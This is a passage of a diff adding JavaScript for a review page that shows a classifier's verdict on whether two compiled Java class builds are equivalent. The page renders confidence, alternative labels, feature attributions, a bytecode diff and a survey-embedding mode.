+   Only pair + prediction are required; featureImportances and javapDiff are
+   optional and render an empty state when absent — that is where the planned
+   investigation tools plug in.
+   ===================================================================== */
+const CASE = window.__CASE__ || {
+  caseId: "pair-004821",
+  model: "Ensemble (one-vs-rest DT + RF meta)",
+  evaluatedAt: "2026-07-23 10:14 UTC",
+  // Class name only — container paths are deliberately not carried in the case
+  // (they can leak the answer and aren't shown).
+  pair: {
+    left:  { role: "Reference build", class: "/org/apache/bcel/classfile/AccessFlags.class" },
+    right: { role: "Build under review", class: "/org/apache/bcel/classfile/AccessFlags.class" }
+  },
+  prediction: {
+    sublabel: "NEQ2-conditionals",
+    confidence: 0.83,
+    // Other labels that also scored highly for this pair (runner-ups).
+    alternatives: [
+      { sublabel: "NEQ2-math", confidence: 0.07 },
+      { sublabel: "NEQ1", confidence: 0.05 },
+      { sublabel: "EQ-SameComp", confidence: 0.03 }
+    ]
+  },
+
+  // Local, signed attribution toward the predicted label for THIS pair
+  // (+ supports the label, − counts against it).
+  featureImportances: [
+    { feature: "d_ins_branch_conditional", value: 0.29 },
+    { feature: "s_insn_records", value: -0.18 },
+    { feature: "s_methodOpcodes", value: 0.11 },
+    { feature: "d_ins_comparison", value: 0.08 },
+    { feature: "s_methodCfgEdges", value: -0.04 }
+  ],
+  javapDiff:
+    "@@ boolean isPublic() @@\n" +
+    "   11: iload_0\n" +
+    "-  12: ifeq          25\n" +
+    "+  12: ifne          25\n" +
+    "   15: iconst_1\n" +
+    "   16: ireturn\n"
+};
+
+/* ---- sub-label interpretation ------------------------------------- */
+function describe(sublabel) {
+  const s = String(sublabel || "");
+  if (s.startsWith("EQ")) {
+    const map = {
+      "EQ-SameMjCompVer": "Equivalent — same compiler and major version. Differences are benign build noise.",
+      "EQ-SameComp": "Equivalent — same compiler, differing version. Differences attributed to the toolchain.",
+      "EQ-DiffComp": "Equivalent — compiled by different compilers. Behaviour matches despite toolchain differences."
+    };
+    return { binary: "EQ", group: "EQ", sev: "ok",
+      desc: map[s] || "Equivalent — the two binaries are judged to behave identically." };
+  }
+  if (s.startsWith("NEQ1")) {
+    return { binary: "NEQ", group: "NEQ1", sev: "warn",
+      desc: "Non-equivalent — a bytecode / API-level change between the two builds." };
+  }
+  if (s.startsWith("NEQ2")) {
+    const fam = s.slice(5) || "unknown";
+    return { binary: "NEQ", group: "NEQ2", sev: "warn",
+      desc: "Non-equivalent — a source-level mutation (" + fam + "-style change) alters behaviour." };
+  }
+  if (s.startsWith("NEQM")) {
+    const tech = s.slice(5).replace(/\./g, "/") || "unknown";
+    return { binary: "NEQ", group: "NEQM", sev: "crit",
+      desc: "Non-equivalent — resembles a MALICIOUS injection (" + tech + "). Warrants close review." };
+  }
+  // Unknown / out-of-distribution label.
+  const binary = s.startsWith("EQ") ? "EQ" : "NEQ";
+  return { binary, group: s || "?", sev: binary === "EQ" ? "ok" : "warn",
+    desc: "Unrecognised label — the model produced a class outside its known set." };
+}
+
+/* ---- glossary: decode project-specific names to plain terms -------- */
+/* Uses window.__GLOSSARY__ (injected by render_review.py) when present, and
+   falls back to raw names / describe() text otherwise. */
+const GLOSSARY = (typeof window !== "undefined" && window.__GLOSSARY__) || null;
+
+function esc(s) {
+  return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+}
+function humanize(t) { return t ? t.replace(/_/g, " ") : t; }
+function prettyClass(p) {
+  // "/org/apache/bcel/classfile/AccessFlags.class" -> "org.apache.bcel.classfile.AccessFlags"
+  return String(p).replace(/^\//, "").replace(/\.class$/i, "").replace(/\//g, ".");
+}
+
+function decodeSublabel(sublabel) {
+  const s = String(sublabel || "");
+  const g = GLOSSARY;
+  if (!g) return { title: s, detail: describe(s).desc };
+  const groups = g.groups || {};
+  if (s.startsWith("EQ")) {
+    const eq = (g.eq_sublabels || {})[s];
+    if (eq) return { title: eq.term, detail: eq.detail };
+    const grp = groups.EQ || {};
+    return { title: grp.term || "Equivalent", detail: grp.detail || "" };
+  }
+  if (s === "NEQ1") { const grp = groups.NEQ1 || {}; return { title: grp.term || s, detail: grp.detail || "" }; }
+  if (s.startsWith("NEQ2")) {
+    const grp = groups.NEQ2 || {}, fam = s.length > 5 ? s.slice(5) : "";
+    const f = (g.neq2_families || {})[fam];
+    if (f) return { title: (grp.term || "") + " — " + f.term, detail: f.detail };
+    return { title: grp.term || s, detail: grp.detail || "" };
+  }
+  if (s.startsWith("NEQM")) {
+    const grp = groups.NEQM || {}, rest = s.length > 5 ? s.slice(5) : "";
+    const flat = (g.neqm_flat || {})[rest];
+    if (flat) return { title: (grp.term || "") + " — " + flat.term,
+                       detail: flat.detail || grp.detail || "" };
+    const parts = rest.split(".");
+    const f = (g.neqm_families || {})[parts[0] || ""];
+    if (!f) return { title: grp.term || s, detail: grp.detail || "" };
+    const subs = g.neqm_subcategories || {};
+    let spec = parts[1] ? (subs[parts[1]] || humanize(parts[1])) : "";
+    const techh = parts[2] ? humanize(parts[2]) : null;
+    if (techh) spec = spec ? spec + " (" + techh + ")" : techh;
+    let title = (grp.term || "") + " — " + f.term;
+    if (spec) title += ": " + spec;
+    return { title, detail: f.detail };
+  }
+  if (s === "NEQ3") { const grp = groups.NEQ3 || {}; return { title: grp.term || s, detail: grp.detail || "" }; }
+  return { title: s, detail: "" };
+}
+
+function decodeFeature(name) {
+  const f = GLOSSARY && GLOSSARY.features && GLOSSARY.features[name];
+  return f ? { term: f.term, detail: f.detail } : { term: name, detail: "" };
+}
+
+function decodeBinary(b) {
+  const e = GLOSSARY && GLOSSARY.binary && GLOSSARY.binary[b];
+  return e ? e.term : (b === "EQ" ? "Equivalent" : "Not equivalent");
+}
+
+/* ---- render ------------------------------------------------------- */
+function text(id, v) { document.getElementById(id).textContent = v; }
+
+function render(c) {
+  const info = describe(c.prediction.sublabel);
+
+  // Fixed theme (e.g. "light" for a uniform survey stimulus); otherwise the
+  // page follows the viewer's OS/browser setting.
+  if (c.theme === "light" || c.theme === "dark") {
+    document.documentElement.setAttribute("data-theme", c.theme);
+  }
+
+  const noticeEl = document.getElementById("notice");
+  if (c.notice) { noticeEl.innerHTML = c.notice; noticeEl.hidden = false; }
+  else { noticeEl.hidden = true; }
+
+  // Survey stimulus = a minimal, unified presentation: hides the decision panel,
+  // attribution, raw code chip, the title eyebrow, the case id, the badge/label
+  // cluster and the confidence meter, and folds accuracy + verdict + reason into
+  // one prose statement.
+  const survey = !!c.survey;
+  const rawHidden = survey || !!c.hideRawLabel;
+
+  const decisionEl = document.querySelector(".decision");
+  if (decisionEl) decisionEl.hidden = survey || !!c.hideDecision;
+  document.getElementById("fiPanel").hidden = survey || !!c.hideAttribution;
+  document.querySelector(".sublabel-row").hidden = rawHidden;
+  document.querySelector(".eyebrow").hidden = survey;
+  document.getElementById("caseId").hidden = survey;
+  document.querySelector(".verdict-head").hidden = survey;
+  document.querySelector(".conf").hidden = survey;
+
+  // Class under review (class name only — container paths are never shown).
+  const cls = (c.pair && c.pair.left && c.pair.left.class) || "";
+  const subjectEl = document.getElementById("subject");
+  if (cls) { subjectEl.innerHTML = "Class &middot; <b>" + esc(prettyClass(cls)) + "</b>"; subjectEl.hidden = false; }
+  else { subjectEl.hidden = true; }
+
+  if (!survey) text("caseId", c.caseId || "—");
+
+  const badge = document.getElementById("badge");
+  badge.textContent = rawHidden ? decodeBinary(info.binary) : info.binary;
+  badge.classList.toggle("friendly", rawHidden);
+  badge.dataset.sev = info.sev;
+  document.getElementById("verdict").dataset.sev = info.sev;
+
+  text("sublabel", c.prediction.sublabel);
+  const dec = decodeSublabel(c.prediction.sublabel);
+  const descEl = document.getElementById("description");
+  descEl.classList.toggle("survey", survey);
+  if (survey) {
+    const verdict = '<b style="color:var(--' + info.sev + '-line)">'
+      + esc(decodeBinary(info.binary)) + '</b>';
+    const acc = (c.accuracy !== undefined && c.accuracy !== null)
+      ? "The model's overall accuracy is <b>" + Math.round(c.accuracy * 100) + "%</b>. "
+      : "";
+    const p1 = acc + "It predicts that these classes are " + verdict + ".";
+    const p2 = "Reason: <b>" + esc(dec.title) + "</b>"
+      + (dec.detail ? " — " + esc(dec.detail) : "");
+    const conf = c.prediction.confidence;
+    // Per-prediction certainty as a quieter closing line, kept apart from the
+    // overall-accuracy figure so the two percentages aren't read back to back.
+    const cert = (conf !== undefined && conf !== null)
+      ? '<span class="cert">The model is <b>' + Math.round(conf * 100)
+        + '%</b> certain of this prediction.</span>'
+      : "";
+    descEl.innerHTML = p1 + "<br><br>" + p2 + (cert ? "<br><br>" + cert : "");
+  } else {
+    descEl.innerHTML =
+      (dec.title ? "<strong class=\"lead\">" + esc(dec.title) + "</strong>" : "")
+      + (dec.detail ? (dec.title ? " — " : "") + esc(dec.detail) : "");
+  }
+
+  if (!survey) {
+    const pct = Math.round((c.prediction.confidence ?? 0) * 100);
+    text("confPct", pct + "%");
+    const bar = document.getElementById("confBar");
+    bar.style.width = pct + "%";
+    bar.style.background = "var(--" + info.sev + "-line)";
+    document.getElementById("caution").classList.toggle("show",
+      (c.prediction.confidence ?? 0) < 0.6);
+  }
+
+  // Overall model accuracy as a separate stat only outside survey mode (survey
+  // folds it into the prose above).
+  const statEl = document.getElementById("modelStat");
+  if (!survey && c.accuracy !== undefined && c.accuracy !== null) {
+    const label = c.accuracyLabel || "Overall model accuracy";
+    statEl.innerHTML = esc(label) + ": <b>" + Math.round(c.accuracy * 100) + "%</b>";
+    statEl.hidden = false;
+  } else {
+    statEl.hidden = true;
+  }
+
+  renderAlternatives(survey ? [] : c.prediction.alternatives, rawHidden);
+  renderFeatureImportances(c.featureImportances);
+  renderDiff(c);
+
+  text("modelName", c.model || "—");
+  text("evaluatedAt", c.evaluatedAt || "—");
+}
+
+function renderAlternatives(alts, hideRaw) {
+  const section = document.getElementById("altSection");
+  const box = document.getElementById("alts");
+  if (!alts || !alts.length) { section.hidden = true; return; }
+  section.hidden = false;
+  box.innerHTML = alts.map(a => {
+    const info = describe(a.sublabel);
+    const dec = decodeSublabel(a.sublabel);
+    const pct = Math.round(a.confidence * 100);
+    // Bar shows the absolute probability (0–100%), so the fill matches the % —
+    // a 2% alternative reads as a 2% bar, not "nearly full".
+    const w = Math.max(0, Math.min(100, a.confidence * 100));
+    const raw = hideRaw ? "" : '<span class="al-raw">' + esc(a.sublabel) + '</span>';
+    return '<div class="alt" data-sev="' + info.sev + '">'
+      + '<div class="al-head"><span class="al-name">'
+      + '<span class="al-term">' + esc(dec.title) + '</span>' + raw + '</span>'
+      + '<span class="al-pct">' + pct + '%</span></div>'
+      + '<span class="al-bar"><span style="width:' + w + '%"></span></span></div>';
+  }).join("");
+}
+
+function renderFeatureImportances(list) {
+  const body = document.getElementById("fiBody");
+  const note = document.getElementById("fiNote");
+  if (!list || !list.length) {
+    note.textContent = "not available";
+    body.innerHTML = '<div class="empty">Feature attribution is not available for '
+      + 'this prediction.<br>Not every model can explain which inputs drove its '
+      + 'decision.</div>';
+    return;
+  }
+  note.textContent = list.length + " features";
+  const max = Math.max(...list.map(f => Math.abs(f.value)), 0.0001);
+  const rows = list.map(f => {
+    const w = Math.round((Math.abs(f.value) / max) * 50); // half-track (%)
+    const pos = f.value >= 0;
+    const bar = '<span class="' + (pos ? "pos" : "neg") + '" style="width:' + w + '%"></span>';
+    const sign = pos ? "+" : "−";
+    const d = decodeFeature(f.feature);
+    const name = '<span class="name"><span class="fname" title="' + esc(d.detail || d.term)
+      + '">' + esc(d.term) + '</span><span class="fraw">' + esc(f.feature) + '</span></span>';
+    return '<div class="fi-row">' + name
+      + '<span class="fi-track"><span class="axis"></span>' + bar + '</span>'
+      + '<span class="val ' + (pos ? "pos" : "neg") + '">' + sign
+      + Math.abs(f.value).toFixed(2) + '</span></div>';
+  }).join("");
+  body.innerHTML =
+    '<p class="fi-caption">Contribution of each input toward the predicted label for '
+    + '<em>this pair</em> — <b>right = supports</b>, <i>left = counts against</i>.</p>'
+    + '<div class="fi">' + rows + '</div>';
+}
+
+function unifiedHtml(diff) {
+  const lines = diff.split("\n").map(line => {
+    let cls = "ln";
+    if (line.startsWith("@@")) cls += " hunk";
+    else if (line.startsWith("+")) cls += " add";
+    else if (line.startsWith("-")) cls += " del";
+    return '<span class="' + cls + '">' + (esc(line) || " ") + '</span>';
+  }).join("");
+  return '<div class="diff"><pre>' + lines + '</pre></div>';
+}
+
+function sideBySideHtml(pairs) {
+  const rows = pairs.map(p =>
+    '<tr class="sxs-' + p.t + '">'
+    + '<td class="sxs-l">' + (esc(p.l) || "&nbsp;") + '</td>'
+    + '<td class="sxs-r">' + (esc(p.r) || "&nbsp;") + '</td></tr>').join("");
+  return '<div class="diff sxs"><table><tbody>' + rows + '</tbody></table></div>';
+}
+
+function renderDiff(c) {
+  const body = document.getElementById("diffBody");
+  const note = document.getElementById("diffNote");
+  const unified = c.javapDiff, full = c.javapDiffFull;
+  const pairs = c.javapPairs && c.javapPairs.length ? c.javapPairs : null;
+
+  if ((unified === undefined || unified === null) && !pairs) {
+    note.textContent = "not available";
+    body.innerHTML = '<div class="empty">A bytecode diff is not available for this case.</div>';
+    return;
+  }
+  if (unified === "" && !pairs) {
+    note.textContent = "identical";
+    body.innerHTML = '<div class="empty">No differences &mdash; the two builds '
+      + 'disassemble to identical bytecode.</div>';
+    return;
+  }
+
+  // Simple case: just the compact unified diff (normal pages).
+  if (!full && !pairs) {
+    note.textContent = "";
+    body.innerHTML = unifiedHtml(unified);
+    return;
+  }
+
+  // Experimental: offer full-diff and/or side-by-side toggles.
+  note.textContent = "";
+  let style = "single", detail = "changes";
+  body.innerHTML = "";
+  const controls = document.createElement("div");
+  controls.className = "diff-controls";
+  controls.innerHTML =
+    (full ? '<span class="dc-group" data-group="detail">'
+      + '<button data-v="changes" class="on">Changes only</button>'
+      + '<button data-v="full">Full diff</button></span>' : '')
+    + (pairs ? '<span class="dc-group" data-group="style">'
+      + '<button data-v="single" class="on">Single column</button>'
+      + '<button data-v="side">Side by side</button></span>' : '');
+  const viewEl = document.createElement("div");
+
+  function draw() {
+    if (style === "side" && pairs) viewEl.innerHTML = sideBySideHtml(pairs);
+    else viewEl.innerHTML = unifiedHtml(detail === "full" && full ? full : (unified || ""));
+    if (typeof reportHeight === "function") reportHeight();
+  }
+  controls.addEventListener("click", e => {
+    const b = e.target.closest("button");
+    if (!b) return;
+    const grp = b.parentElement.getAttribute("data-group");
+    if (grp === "detail") detail = b.getAttribute("data-v");
+    else if (grp === "style") style = b.getAttribute("data-v");
+    b.parentElement.querySelectorAll("button").forEach(x => x.classList.toggle("on", x === b));
+    draw();
+  });
+  body.appendChild(controls);
+  body.appendChild(viewEl);
+  draw();
+}
+
+/* ---- reviewer decision (local; persistence added when wired up) ---- */
+document.querySelectorAll('.actions .btn').forEach(btn => {
+  btn.addEventListener('click', () => {
+    const pressed = btn.getAttribute('aria-pressed') === 'true';
+    document.querySelectorAll('.actions .btn').forEach(b =>
+      b.setAttribute('aria-pressed', 'false'));
+    const status = document.getElementById('decStatus');
+    if (pressed) { status.textContent = 'No decision recorded.'; return; }
+    btn.setAttribute('aria-pressed', 'true');
+    const labels = { agree: 'Agreed with the recommendation',
+      override: 'Overrode the recommendation', defer: 'Flagged for more investigation' };
+    status.innerHTML = 'Recorded: <b>' + labels[btn.dataset.kind] + '</b>.';
+  });
+});
+
+render(CASE);
+
+/* ---- iframe auto-resize (for embedding, e.g. in a Qualtrics survey) ----
+   Reports this page's height to the parent frame so the embedding page can size
+   the iframe with no inner scrollbar.  Harmless when not embedded. */
+function reportHeight() {
+  if (!document.body) return;
+  var h = Math.max(document.body.scrollHeight,
+                   document.documentElement.scrollHeight);
+  try { parent.postMessage({ type: "bineq-review-height", height: h }, "*"); }
+  catch (e) { /* ignore */ }
+}
+window.addEventListener("load", reportHeight);
+window.addEventListener("resize", reportHeight);
+document.querySelectorAll("details").forEach(function (d) {
+  d.addEventListener("toggle", reportHeight);
+});
+if (window.ResizeObserver) new ResizeObserver(reportHeight).observe(document.body);
+reportHeight();
+</script>
+</body>
+</html>
